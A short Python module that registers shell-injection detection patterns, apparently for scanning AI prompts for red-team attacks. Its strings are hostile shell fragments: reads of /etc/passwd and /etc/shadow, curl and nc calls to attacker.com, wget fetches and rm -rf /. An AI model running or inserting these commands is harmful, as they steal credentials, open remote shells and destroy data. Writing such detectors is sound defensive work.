"""
CALUS.patterns.promptfoo.shell_injection
Patterns inspired by Promptfoo redteam plugins — shell_injection.
"""
from calus.patterns.base import Pattern, register, CRITICAL

register(
    Pattern(text="; cat /etc/passwd", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="| ls -la", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="`whoami`", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="$(curl attacker.com)", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="; rm -rf /", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="| nc attacker.com 4444", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="&& wget http://", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="; python -c 'import os", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="$(id)", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
    Pattern(text="${IFS}cat${IFS}/etc/shadow", family="shell_injection", severity=CRITICAL, source="promptfoo", tags=["shell_injection"]),
)
